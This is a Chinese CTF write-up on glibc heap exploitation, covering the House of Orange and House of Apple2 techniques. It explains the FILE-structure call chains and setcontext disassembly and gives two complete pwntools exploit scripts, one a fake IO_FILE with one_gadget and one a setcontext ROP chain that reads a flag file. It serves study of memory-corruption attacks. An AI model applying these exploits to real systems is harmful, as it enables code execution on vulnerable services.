### house of orange

通过将top chunk的size字段改小，分配大chunk时会将old top chunk纳入unsortedbin，这样可以没有free函数的情况下获取空闲chunk，以此来泄露libc基址

#### houseoforange_hitcon_2016

首先edit有3次，add有4次，由于没有free功能，fastbin attack就不可能了，就是unsortedbin attack和largebin attack来修改IO_list_all来打IO_FILE

首先考虑largebin attack，因为可以直接将IO_list_all改为堆上地址，方便控制fake_IO_FILE内容，思路为

1. add
2. edit改写topchunk1的size
3. add bigchunk	将topchunk1放入unsortedbin中
4. edit	改写topchunk2的size
5. add bigchunk  将topchunk1放入到largebin中，将topchunk2放入到unsortedbin
6. add bigchunk 触发largebin attack

利用需要修改topchunk1进入到largebin后的跳表指针，但是为了利用使chunk进入正确的bin，只能分配大chunk，即无法分配可以修改处于topchunk1上的chunk，edit又只能修改当前chunk，很难进行bk_nextsize指针的伪造，同时基址的泄露也是问题，新分配的chunk总是在高地址，没办法show旧堆块的内容

考虑unsortedbin attack

1. add
2. edit	改写oldtopchunk的size
3. add bigchunk	将oldtopchunk放入unsortedbin中
4. add smallchunk  从oldtopchunk中分配，但是大小要大于smallbin中chunk的最大大小，这样就会先将oldtopchunk放入largebin再切割，从而泄露堆基址
5. show泄露堆基址
6. edit 将被切割的oldtopchunk的bk改为IO_list_all-0x10，被切割的oldtopchunk的size改为small size
7. add bigchunk将unsortedbin中chunk取出放入的smallbin，触发unsortedbin attack，IO_list_all被改为unsortedbin的地址，同时将对应smallbin的fd和bk域改为一个chunk

IO_list_all指向了unsortedbin，而这段数据是不可控的，首先思考伪造unsortedbin+0xd8为vtable，将unsortedbin中chunk的size的值改为巧妙的值，进入smallbin时使得unsortedbin+0xd8恰好为这个unsortedbin chunk，在这个chunk上填充one_gadget

但是由于这段地址的内容不可控，许多限制无法绕过，触发不了IO_overflow

通过打fake_IO_FILE的chain字段，完全伪造一个IO_FILE来实现利用

即将unsortedbin+0x68处的smallbin的值改为unsortedbin chunk，

```
from pwn import *

context(log_level='debug',arch='amd64',os='linux')

io = process('/home/kali/pwn/ctfwiki/houseoforange/houseoforange')
# io = gdb.debug('/home/kali/pwn/ctfwiki/houseoforange/houseoforange')

libc = ELF('/home/kali/pwn/libc/x64/libc-2.23.so')


def add(size,payload,price=0x12345678,color=0xddaa):
    io.sendafter(b'Your choice : ',b'1')
    io.sendafter(b'Length of name :',str(size).encode(encoding='utf-8'))
    io.sendafter(b'Name :',payload)
    io.sendafter(b'Price of Orange:',str(price).encode(encoding='utf-8'))
    io.sendafter(b'Color of Orange:',str(color).encode(encoding='utf-8'))


def show():
    io.sendafter(b'Your choice : ', b'2')


def edit(size, payload,price=0x12345678,color=0xddaa):
    io.sendafter(b'Your choice : ', b'3')
    io.sendafter(b'Length of name :', str(size).encode(encoding='utf-8'))
    io.sendafter(b'Name:', payload)
    io.sendafter(b'Price of Orange: ', str(price).encode(encoding='utf-8'))
    io.sendafter(b'Color of Orange: ', str(color).encode(encoding='utf-8'))


offset = 0x3c4b78+0x610
io_list_all_offset = libc.sym['_IO_list_all']
system_offset = libc.sym['system']
one_gadget = [0xf03a4,0xf1247,0x4527a,0x45226]


add(0x100,b'a'*8)
edit(0x200,b'\x00'*(0x100+0x20)+p64(0)+p64(0xeb1))
add(0x1000,b'a'*8)
add(0x400,b'a'*8)
show()

unsortedbin = u64(io.recvuntil(b'\x7f')[-6::].ljust(8,b'\x00'))
libc_base = unsortedbin - offset
print(hex(libc_base))

edit(0x200,b'a'*0x10)
show()
heap_addr = u64(io.recvuntil(b'Price')[-6-6:-6:].ljust(8,b'\x00'))
print(hex(heap_addr))

io_list_all = io_list_all_offset+libc_base
system_addr = system_offset + libc_base


payload = b'\x00'*(0x400+0x20) + p64(0) + p64(0x61) + p64(unsortedbin) + p64(io_list_all-0x10)
payload = payload.ljust((0x28+0x420),b'\x00')
payload += p64(1)
payload = payload.ljust((0xd8+0x420),b'\x00')
payload += p64(heap_addr+0x410+0x20+0xf0)
payload = payload.ljust((0xf0+0x420),b'\x00')
payload += p64(one_gadget[1]+libc_base)*30

edit(0x1000,payload)
io.sendafter(b'Your choice : ',b'1')


# gdb.attach(io)
io.interactive()
```

house of orange也为一种固定模板，即将unsortedbin中的chunk的size改为0x61，修改unsortedbin+0x68出的fake chain为unsortedbin中的chunk

属于IO_FILE最简单的利用，在libc-2.23中没有对vtable地址的检查，可以在任意地址伪造vtable

### house of apple2

#### 调用链

exit函数中会调用对应文件指针的IO_overflow函数，当改写为_IO_wfile_jumps，会调用_IO_wfile_overflow函数

```c
wint_t _IO_wfile_overflow (FILE *f, wint_t wch)
{
	if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    	{
		f->_flags |= _IO_ERR_SEEN;
		__set_errno (EBADF);
		return WEOF;
    	}

	/* If currently reading or no buffer allocated. */
	if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
    	{
		/* Allocate a buffer if needed. */
		if (f->_wide_data->_IO_write_base == 0)
		{
			_IO_wdoallocbuf (f);
			...


  return wch;
}
```

绕过限制调用 `_IO_wdoallocbuf`

```c
void _IO_wdoallocbuf (FILE *fp)
{
    if (fp->_wide_data->_IO_buf_base)
        return;
    if (!(fp->_flags & _IO_UNBUFFERED))
        if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
            return;  
    _IO_wsetb (fp, fp->_wide_data->_shortbuf, fp->_wide_data->_shortbuf + 1, 0);
}
```

绕过限制调用 `_IO_WDOALLOCATE (fp)`

而 `_IO_WDOALLOCATE`这个宏没有对vtable指针做合法性检查

一系列宏

```c
#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS)
#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)
// 而在调用_IO_FILE的vtable的函数时，进行了检查
# define _IO_JUMPS_FUNC(THIS)  (IO_validate_vtable (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS) + (THIS)->_vtable_offset)))
```

然后我们就可以改写 `fp->_wide_data->vatble->__doallocate` 指针实现rop

这里说下rop的过程高版本libc由rdx寄存器来控制寄存器内容

```c
.text:0000000000054F5D 48 8B A2 A0 00 00 00          mov     rsp, [rdx+0A0h]
.text:0000000000054F64 48 8B 9A 80 00 00 00          mov     rbx, [rdx+80h]
.text:0000000000054F6B 48 8B 6A 78                   mov     rbp, [rdx+78h]
.text:0000000000054F6F 4C 8B 62 48                   mov     r12, [rdx+48h]
```

如何控制rdx寄存器，在_IO_wfile_overflow中

```c
text:0000000000089CE0 F3 0F 1E FA                   endbr64
.text:0000000000089CE4 55                            push    rbp

...

.text:0000000000089D02 48 8B 97 A0 00 00 00          mov     rdx, [rdi+0A0h]
.text:0000000000089D09 48 83 7A 18 00                cmp     qword ptr [rdx+18h], 0
.text:0000000000089D0E 0F 84 0C 02 00 00             jz      loc_89F20

...

.text:0000000000089F20                               loc_89F20:                              ; CODE XREF: _IO_wfile_overflow+2E↑j
.text:0000000000089F20 E8 6B D5 FF FF                call    _IO_wdoallocbuf
```

省略部分代码，可以看到中间的操作 `if(f->_wide_data->_IO_write_base == 0)`

`qword ptr [rdi+0xA0h]`即 `f->_wide_data` 即 fake_IO_wide，`qword ptr [rdx+18h]`即 `f->_wide_data->_IO_write_base`

当跳转到 `_IO_wdoallocbuf` 即setcontext时，rdx即fake_IO_wide，只要在fake_IO_wide后这段内存布置好内容就可以劫持寄存器的内容，我们需要劫持rsp

看context

```c
.text:0000000000054F5D 48 8B A2 A0 00 00 00          mov     rsp, [rdx+0A0h]
.text:0000000000054F64 48 8B 9A 80 00 00 00          mov     rbx, [rdx+80h]
.text:0000000000054F6B 48 8B 6A 78                   mov     rbp, [rdx+78h]
.text:0000000000054F6F 4C 8B 62 48                   mov     r12, [rdx+48h]
.text:0000000000054F73 4C 8B 6A 50                   mov     r13, [rdx+50h]
.text:0000000000054F77 4C 8B 72 58                   mov     r14, [rdx+58h]
.text:0000000000054F7B 4C 8B 7A 60                   mov     r15, [rdx+60h]
.text:0000000000054F7F 64 F7 04 25 48 00 00 00 02 00+test    dword ptr fs:48h, 2
.text:0000000000054F7F 00 00
.text:0000000000054F8B 0F 84 B5 00 00 00             jz      loc_55046

...

.text:0000000000055046                               loc_55046:                              ; CODE XREF: setcontext+6B↑j
.text:0000000000055046 48 8B 8A A8 00 00 00          mov     rcx, [rdx+0A8h]
.text:000000000005504D 51                            push    rcx
.text:000000000005504E 48 8B 72 70                   mov     rsi, [rdx+70h]
.text:0000000000055052 48 8B 7A 68                   mov     rdi, [rdx+68h]
.text:0000000000055056 48 8B 8A 98 00 00 00          mov     rcx, [rdx+98h]
.text:000000000005505D 4C 8B 42 28                   mov     r8, [rdx+28h]
.text:0000000000055061 4C 8B 4A 30                   mov     r9, [rdx+30h]
.text:0000000000055065 48 8B 92 88 00 00 00          mov     rdx, [rdx+88h]
.text:000000000005506C 31 C0                         xor     eax, eax
.text:000000000005506E C3                            retn
```

注意在ret之前push rcx，rcx即rdx+0xa8处的值，rdx+0xa8处的内容即返回地址，rsp即rdx+0xa0处的值

控制rdx+0xa8处的值和rdx+0xa0处的值就控制了rip和rsp

给出一典型利用，满足的条件如下

* `_flags`设置为 `~(2 | 0x8 | 0x800)`，如果不需要控制 `rdi`，设置为 `0`即可；如果需要获得 `shell`，可设置为 `  sh`，注意前面有两个空格
* `vtable`设置为 `_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap`地址（加减偏移），使其能成功调用 `_IO_wfile_overflow`即可
* `_wide_data`设置为可控堆地址 `A`，即满足 `*(fp + 0xa0) = A`
* `_wide_data->_IO_write_base`设置为 `0`，即满足 `*(A + 0x18) = 0`
* `_wide_data->_wide_vtable`设置为可控堆地址 `B`，即满足 `*(A + 0xe0) = B`
* `_wide_data->_wide_vtable->doallocate`设置为地址 `C`用于劫持 `RIP`，即满足 `*(B + 0x68) = C`

##### ISCC_heapheap

```c
from pwn import *

context(log_level='debug', arch='amd64', os='linux')


io = process('/home/kali/pwn/ISCC/ISCC_pwn_9/heapheap')
# io = gdb.debug('/home/kali/pwn/ISCC/ISCC_pwn_9/heapheap')
# io = remote('182.92.237.102',11000)

libc = ELF('/home/kali/pwn/ISCC/ISCC_pwn_9/libc-2.31.so')


def create(index, size):
    io.sendlineafter(b'choice',b'1')
    io.sendlineafter(b'index',str(index).encode(encoding='utf-8'))
    io.sendlineafter(b'Size',str(size).encode(encoding='utf-8'))


def free(index):
    io.sendlineafter(b'choice',b'4')
    io.sendlineafter(b'index',str(index).encode(encoding='utf-8'))


def edit(index, content):
    io.sendlineafter(b'choice', b'3')
    io.sendlineafter(b'index',str(index).encode(encoding='utf-8'))
    io.sendafter(b'context', content)


def show(index):
    io.sendlineafter(b'choice', b'2')
    io.sendlineafter(b'index', str(index).encode(encoding='utf-8'))


create(0, 0x420)
create(1, 0x410)
create(2, 0x410)
create(3, 0x410)
free(0)
show(0)

libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 96 - 0x10 - libc.symbols['__malloc_hook']
print(hex(libc_base))
io_list_all = libc_base + 0x1ed5a0

create(4, 0x430)
edit(0, b'a' * (0x10 - 1) + b'A')
show(0)
io.recvuntil(b'A')
heap_addr = u64(io.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
print(hex(heap_addr))


fd = libc_base + 0x1ecfd0
print(hex(fd))
payload = p64(fd) * 2 + p64(heap_addr) + p64(io_list_all - 0x20)
edit(0, payload)

free(2)
create(5, 0x470)
free(5)

open_addr = libc_base + libc.sym['open']
read_addr = libc_base + libc.sym['read']
write_addr = libc_base + libc.sym['write']
setcontext_addr = libc_base + libc.sym['setcontext']

pop_rdi_ret = libc_base + 0x0000000000023b6a
pop_rsi_ret = libc_base + 0x000000000002601f
pop_rdx_r12_ret = libc_base + 0x0000000000119431
ret_addr = libc_base + 0x0000000000022679

largebinchunk = heap_addr + 0x850     # chunk2
print(hex(largebinchunk))
IO_wfile_jumps = libc_base + 0x1e8f60

fake_IO_addr = largebinchunk
fake_IO_wide_addr = largebinchunk+0x100
fake_IO_vtable_addr = largebinchunk+0x200
orw_addr = largebinchunk+0x300
print_addr = heap_addr + 0x10
flag_addr = largebinchunk+0x400

fake_IO = b''
fake_IO = fake_IO.ljust(0x28-0x10,b'\x00')
fake_IO += p64(1)
fake_IO = fake_IO.ljust(0xa0-0x10,b'\x00')
fake_IO += p64(fake_IO_wide_addr)
fake_IO = fake_IO.ljust(0xd8-0x10,b'\x00')
fake_IO += p64(IO_wfile_jumps)
fake_IO = fake_IO.ljust(0x100-0x10)

fake_IO_wide = b''
fake_IO_wide = fake_IO_wide.ljust(0xa0,b'\x00')
fake_IO_wide += p64(orw_addr) + p64(ret_addr)
fake_IO_wide = fake_IO_wide.ljust(0xe0,b'\x00')
fake_IO_wide += p64(fake_IO_vtable_addr)
fake_IO_wide = fake_IO_wide.ljust(0x100,b'\x00')

fake_IO_vtable = b''
fake_IO_vtable = fake_IO_vtable.ljust(0x68,b'\x00')
fake_IO_vtable += p64(setcontext_addr+61)
fake_IO_vtable = fake_IO_vtable.ljust(0x100,b'\x00')

orw = p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(0) + p64(open_addr)
orw += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(print_addr) + p64(pop_rdx_r12_ret) + p64(0x50) + p64(0) + p64(read_addr)
orw += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(print_addr) + p64(pop_rdx_r12_ret) + p64(0x50) + p64(0) + p64(write_addr)
orw = orw.ljust(0x100,b'\x00')

flag = b'./flag'
payload = fake_IO + fake_IO_wide + fake_IO_vtable + orw + flag

edit(2, payload)

io.recvuntil(b'choice')
io.sendline(b'5')

# gdb.attach(io)
io.interactive()
```

参考 [[原创] House of apple 一种新的glibc中IO攻击方法 (2)-Pwn-看雪安全社区｜专业技术交流与安全研究论坛](https://bbs.kanxue.com/thread-273832.htm)
